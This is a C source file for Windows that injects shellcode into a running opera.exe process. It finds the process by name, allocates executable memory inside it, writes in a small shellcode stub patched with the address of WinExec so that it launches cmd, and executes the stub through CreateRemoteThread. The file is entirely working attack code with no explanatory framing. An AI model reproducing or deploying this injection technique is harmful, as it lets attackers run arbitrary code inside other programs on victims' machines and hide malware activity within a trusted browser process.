#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "\x8B\xDC"
"\x68\x63\x6D\x64\x20"
"\x8B\xC4"
"\x6A\x01"
"\x50"
"\xB8\x41\x2C\x9A\x77"
"\xFF\xD0"
"\x8B\xE3"
"\x5A";

void PrepareShellcode(void)
{
	unsigned long KernelAddr;
	DWORD dwOldProtect;

	KernelAddr = (unsigned long)GetModuleHandle(TEXT("Kernel32"));

	*(DWORD *)(shellcode + 13) = (DWORD)GetProcAddress((HMODULE)KernelAddr, "WinExec");
}

DWORD GetPID(LPTSTR lpProcess)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	HANDLE hProcess = NULL;
	DWORD ProcessID = 0;

	if ((snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
	{
		RtlZeroMemory(&pe32, sizeof(PROCESSENTRY32));
		pe32.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &pe32);
		do
		{
			if (lstrcmp(pe32.szExeFile, lpProcess) == 0)
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &pe32));
	}
		
	CloseHandle(snapshot);
	return ProcessID;
}

void Inject(HANDLE hProcess)
{
	PVOID	pRemoteShellcode = NULL;
	HANDLE	hRemoteThread = NULL;
	DWORD	dwRemoteThreadID = 0;
	DWORD	dwInjectStatus = 0;

	PrepareShellcode();
	
	__try
	{
		int size = sizeof(shellcode);

		pRemoteShellcode = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pRemoteShellcode == NULL)
		{
			printf("VirtualAllocEx failed. Last error: %x\n", GetLastError());
			__leave;
		}

		WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, size, NULL);

		hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, &dwRemoteThreadID);
		if (hRemoteThread == NULL)
		{
			printf("CreateRemoteThread failed. Last error: %x\n", GetLastError());
			__leave;
		}

		WaitForSingleObject(hRemoteThread, INFINITE);
		GetExitCodeThread(hRemoteThread, &dwInjectStatus);
	}
	__finally
	{
		if (!dwInjectStatus)
		{
			printf("Injection failed\n");
			VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);

			if (hRemoteThread != NULL)
			{
				CloseHandle(hRemoteThread);
			}
		}
	}
}

int main()
{
	DWORD ProcessID;
	HANDLE hProcess;

	ProcessID = GetPID(TEXT("opera.exe"));
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);

	if (hProcess != INVALID_HANDLE_VALUE)
	{
		Inject(hProcess);
		CloseHandle(hProcess);
	}
	return 0;
}